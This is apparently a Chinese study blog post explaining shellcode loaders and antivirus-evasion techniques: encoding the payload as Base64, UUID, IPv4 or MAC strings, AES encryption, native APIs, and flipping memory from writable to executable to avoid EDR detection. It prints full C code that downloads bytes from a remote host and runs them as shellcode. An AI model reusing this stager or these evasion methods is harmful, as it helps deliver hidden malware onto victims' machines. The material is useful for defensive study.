---
title:最简单的Loader
date: 2026-06-022
tag: 免杀
summary: 读懂工作原理
cover: ./assets/cat-angry.png
---

# 最简单的Loader

## 地址：https://github.com/SaadAhla/Shellcode-Hide

目标：

>1.获取到内存
>
>2.往内存中写入shellcode
>
>3.赋予内存执行权限
>
>4.执行shellcode。

整体结构：shellcode 定义 → 分配内存 → 写入 shellcode → 修改内存权限 → 创建线程执行

## Simple Loader

### 代码解读

先阅读项目代码：

shellcode 定义

![image-20260604104959759](./assets/posts/最简单的Loader/image-20260604104959759.png)

看注释可知是`Metasploit`生成的`payload.c`

功能：向攻击者的机器发起反向 `TCP` 连接，返回一个`cmd shell`。

分配可写内存

![image-20260604111334742](./assets/posts/最简单的Loader/image-20260604111334742.png)

- `LPVOID alloc_mem = void* alloc_mem`  是一个通用指针，用来保存`VirtualAlloc`申请的内存地址
- `VirtualAlloc` 是`Windows API`用来在进程地址空间中申请一块内存
- `NULL` 意思是不指定内存地址，让系统自己安排
- `MEM_COMMIT | MEM_RESERVE`  同时保留并提交内存页（RESERVE先在进程的虚拟地址空间预留一块地址范围，COMMIT真正给这块地址分配可用的内存资源）
- `PAGE_READWRITE` 初始权限可读可写

写入`shellcode`，将`shellcode`字节组复制到刚分配的内存区域

![image-20260604170244347](./assets/posts/最简单的Loader/image-20260604170244347.png)

声明变量：

```
DWORD oldProtect;
```

`Windows API` 里，很多状态值、权限值、错误码都会用 `DWORD` 保存。

`oldProtect`因为 `VirtualProtect` 修改内存权限的时候，需要你传一个变量地址，用来接收**修改前的内存权限**

修改内存权限为可执行

```
VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);
```

- 将内存权限从（读写）改成（读+执行）`	RW`，`RX`
- 这种“先写后改权限”的模式是为了规避安全软件对`RWX`内存的检测（直接申请 更容易被EDR标记）`PAGE_EXECUTE_READWRITE`

| 参数                | 含义                     |
| ------------------- | ------------------------ |
| `alloc_mem`         | 要修改权限的内存起始地址 |
| `sizeof(payload)`   | 要修改多大一块内存       |
| `PAGE_EXECUTE_READ` | 新权限：可读、可执行     |
| `&oldProtect`       | 用来保存原来的权限       |

创建线程执行`Shellcode`

![image-20260604211407591](./assets/posts/最简单的Loader/image-20260604211407591.png)

将`shellcode`地址强转为函数指针，作为线程入口点

`CreateThread`创建新线程来执行`shellcode`

`WaitForSingleObject(..., INFINITE)`让主线程阻塞等待，防止进程提前退出

## Base64 Loading 

![image-20260604221200444](./assets/posts/最简单的Loader/image-20260604221200444.png)

不直接把`shellcode`写进代码，而是进行`base64`编码

`const char payload[]` 定义一个只读字符串数组

将原始`shellcode`base64之后更像普通字符 降低源码里原始`shellcode`的特征

注意：只是编码不是加密，很容易还原

解码`base64`字符串

 这一步将原来的`MoveMemory`复制`payload` 改成`CryptStringToBinaryA`解码`base64`到内存![image-20260604221739056](./assets/posts/最简单的Loader/image-20260604221739056.png)

## CustomEncoding

 不在直接放真实的payload![image-20260604223442244](./assets/posts/最简单的Loader/image-20260604223442244.png)

运行的时候再`Decode(payload)`

再复制到内存执行（`CopyMemory`）

![image-20260604223836174](./assets/posts/最简单的Loader/image-20260604223836174.png)

## UUID shellcode

把`payload`拆成很多段之后用UUID表示

![image-20260604224708941](./assets/posts/最简单的Loader/image-20260604224708941.png)

创建可执行堆`hHeap`

![image-20260604224839866](./assets/posts/最简单的Loader/image-20260604224839866.png)

但是和之前不同的是这里的`HEAP_CREATE_ENABLE_EXECUTE`是一个可执行的堆之前都是申请读写的内存然后将其改成可执行的，所以这一版不需要再单独调用`VirtualProtect`将内存改为可执行

**从堆里申请内存：**

![image-20260604225142266](./assets/posts/最简单的Loader/image-20260604225142266.png)

把指针转成整数类型，方便后面做地址加法，后面每写入一个UUID就要往后移动16字节

`DWORD_PTR`是 Windows 专门定义的一种类型。它的特点是

```
在 32 位程序里：DWORD_PTR 是 32 位
在 64 位程序里：DWORD_PTR 是 64 位
```

```
DWORD_PTR ptr = (DWORD_PTR)alloc_mem; 
//把 alloc_mem 这个内存地址，转换成一个整数形式保存到 ptr 里。
```

计算UUID 的数量

```
 int init = sizeof(uuids) / sizeof(uuids[0]);
```

`sizeof(uuids)` 是整个数组大小。
 `sizeof(uuids[0])` 是一个元素的大小，也就是一个 `char*` 指针的大小。

![image-20260604225312322](./assets/posts/最简单的Loader/image-20260604225312322.png)

 **UUID 还原 payload**

![image-20260604225806142](./assets/posts/最简单的Loader/image-20260604225806142.png)

```
从第一个 UUID 开始，一个个处理：

1. 取出当前 UUID 字符串；
2. 用 UuidFromStringA 把它转成 16 字节；
3. 把这 16 字节写到 ptr 当前指向的内存位置；
4. 如果转换失败，就打印错误并退出；
5. 如果成功，就把 ptr 往后移动 16 字节；
6. 继续处理下一个 UUID。
```

## IPV4 shellcode

上面是把shellcode伪装成UUID这个是伪装成一堆IPV4的地址字符串

![image-20260604231418593](./assets/posts/最简单的Loader/image-20260604231418593.png)

比如第一个252.72.131.228 对应十六进制就是

```
252 = FC
72  = 48
131 = 83
228 = E4
```

那就是代表` FC 48 83 E4`四个字节

观察到多出来一些变量

![image-20260604231627725](./assets/posts/最简单的Loader/image-20260604231627725.png)

`Terminator` 是给 `RtlIpv4StringToAddressA` 用的，它可以接收解析停止的位置。

 核心循环：![image-20260604231842223](./assets/posts/最简单的Loader/image-20260604231842223.png)

把每一个 IPv4 字符串转成 4 字节，然后连续写入 alloc_mem。

```
RPC_STATUS STATUS = RtlIpv4StringToAddressA((PCSTR)IPv4s[i], FALSE, &Terminator, (in_addr*)ptr);
//“解码器”
```

## MAC Shellcode

把 payload 伪装成了 **MAC 地址字符串**。

```
IPv4 版：一个 IP 地址还原 4 字节
MAC 版：一个 MAC 地址还原 6 字节
```

```
RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
//把 MAC 字符串转换成 6 字节的二进制地址。
```

## AES Shellcode

1. payload 不再只是 Base64 / UUID / IP 这种编码，而是 AES 加密后的数据
2. 内存申请、改权限、创建线程不用 VirtualAlloc / VirtualProtect / CreateThread，而是换成 Nt* Native API

之前用的API 和这一版的对比

| 之前                | 现在                    |
| ------------------- | ----------------------- |
| VirtualAlloc        | NtAllocateVirtualMemory |
| VirtualProtect      | NtProjectVitualMemory   |
| CreatThread         | NtCreatThreadEx         |
| WaitForSingleObject | NtWaitForSingleObject   |

> Win32 API 是更常见、更上层的接口
> Nt* API 更接近 ntdll 层，属于 Native API

![image-20260605102133618](./assets/posts/最简单的Loader/image-20260605102133618.png)

用 key 派生出 `AES-256` 密钥。然后把 `AESshellcode` 原地解密成原始 payload

- `hPro`负责提供加密能力
- `hHash`负责把`key`做`SHA-256`
- `hKey`负责把真正用于`AES`解密

![image-20260605103652689](./assets/posts/最简单的Loader/image-20260605103652689.png)

获取加密上下文

`PROV_RSA_AES`说明要用支持AES的加密提供者

`CRYPT_VERIFYCONTEXT`表示临时用途，不需要访问持久密钥容器

![image-20260605103915324](./assets/posts/最简单的Loader/image-20260605103915324.png)

创建`SHA-256`的哈希对象

不是直接拿`AESkey`做AES密钥，而是对它先做`SHA-256`

![image-20260605104107978](./assets/posts/最简单的Loader/image-20260605104107978.png)

把传进来的key喂给SHA-256 哈希对象

![image-20260605104210819](./assets/posts/最简单的Loader/image-20260605104210819.png)

根据前面的SHA-256哈希结果，派生出一个AES-256密钥

![image-20260605104658792](./assets/posts/最简单的Loader/image-20260605104658792.png)

核心解密步骤，把shellcode指向的数据进行AES解密

![image-20260605105327227](./assets/posts/最简单的Loader/image-20260605105327227.png)

AES解密：

![image-20260605105507335](./assets/posts/最简单的Loader/image-20260605105507335.png)

## Using Sockets

 RunShellcode：把执行shellcode的流程单独封装成一个函数

前面的版本都是在main里执行：申请内存、写入shellcode、修改权限、创建线程、等待线程

 而void RunShellcode 不管shellcode是从数组来的、AES解密来的还是socket网络接收来的，只要把shellcode的地址和长度传进来，这个函数就可以执行它![image-20260605105925386](./assets/posts/最简单的Loader/image-20260605105925386.png)

接收的两个参数：从shellcode这个地址开始一共有shellcodelen个字节需要处理

- char* shellcode 表示shellcode的起始地址，也就是一段字节数据的指针
- DWORD shellcodeLen 表示shellcode的长度

通过socket从远程地址取一段数据，然后把收到的数据交给`RunShellcode`执行

前面的`RunShellcode_Run()`负责：申请内存、复制shellcode、改执行权限、创建线程执行

这个`getShellcode_Run()`负责：远程连接主机、发送请求、接收数据、调用Runshellcode

```
void getShellcode_Run(char* host, char* port, char* resource) {

    DWORD oldp = 0;
    BOOL returnValue;

    size_t origsize = strlen(host) + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t Whost[newsize];
    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);


    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    char sendbuf[MAX_PATH] = "";
    lstrcatA(sendbuf, "GET /");
    lstrcatA(sendbuf, resource);

    char recvbuf[DEFAULT_BUFLEN];
    memset(recvbuf, 0, DEFAULT_BUFLEN);
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return ;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return ;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return ;
        }

        // Connect to server.
        printf("[+] Connect to %s:%s", host, port);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return ;
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }

    printf("\n[+] Sent %ld Bytes\n", iResult);
    
    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }
    
    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("[+] Received %d Bytes\n", iResult);
        else if (iResult == 0)
            printf("[+] Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());


        RunShellcode(recvbuf, recvbuflen);

    } while (iResult > 0);

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();
}
```

这个函数接收三个参数，从 host:port 请求 resource，然后拿返回的数据继续处理。返回的数据被当作shellcode交给`RunShellcode()`

```
void getShellcode_Run(char* host, char* port, char* resource) {
```

| 参数       | 含义                           |
| ---------- | ------------------------------ |
| `host`     | 远程主机地址，比如域名或 IP    |
| `port`     | 端口，比如 `"80"`              |
| `resource` | 请求的资源路径，比如某个文件名 |

把host转成宽字符，准备一个宽字符版本的host

```
size_t origsize = strlen(host) + 1;
const size_t newsize = 100;
size_t convertedChars = 0;
wchar_t Whost[newsize];
mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);
//把多字节字符串 char* 转成宽字符字符串 wchar_t*；host  →  Whost
```

比如把``"127.0.0.1"``转成宽字符`L"127.0.0.1"`

Winsock相关变量：准备sockets网络连接需要用到的变量 先把变量定义好

```
 WSADATA wsaData; //WSADSTA是Winsock里面的一个结构体
    SOCKET ConnectSocket = INVALID_SOCKET;
    //ConnectSocket 用来保存后面创建出来的 socket。
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
```

在使用wsadata就是来接收Winsock初始化信息的，Windows下使用socket之前，必须先初始化Winsock

```
iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
```

准备一个变量，让 WSAStartup 把 Winsock 的版本、状态等信息填进去。

```
 char sendbuf[MAX_PATH] = "";
    lstrcatA(sendbuf, "GET /");
    lstrcatA(sendbuf, resource);
```

这三句是在拼接socket发出去的请求内容

```
 ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
```

- 我要 IPv4 地址；
- 我要 TCP 连接；
- 我要流式 socket。

 流程图：![ChatGPT Image 2026年6月5日 16_16_15](E:\浏览器下载\csdn文章下载\ChatGPT Image 2026年6月5日 16_16_15.png)

## Using WinHttp shellcode

这一版和上一个 Using Sockets 版本的核心区别在于网络请求方式变了。

上一个版本是直接使用 Winsock，手动完成 `WSAStartup`、`getaddrinfo`、`socket`、`connect`、`send`、`recv` 这一整套底层 TCP 通信流程；

而这一版改成了 WinHTTP 思路：准备通过 `WinHttpOpen`、`WinHttpConnect`、`WinHttpOpenRequest`、`WinHttpSendRequest`、`WinHttpReadData` 这类更高层的 HTTP API 来获取远程数据。

所以它不再需要自己手动拼完整的 socket 连接流程，而是把 HTTP 请求交给 WinHTTP 处理。与此同时，代码里的 `host` 和 `resource` 也从普通的 `char*` 转成了 `wchar_t*`，因为 WinHTTP 更常用宽字符参数；`port` 也从字符串转成了数字类型 `DWORD`。本质上，两版目标没有变，都是“从远程获取数据，再交给 `RunShellcode()` 处理”，只是上一个是底层 socket 写法，这一个是更像 Windows HTTP 客户端的写法。
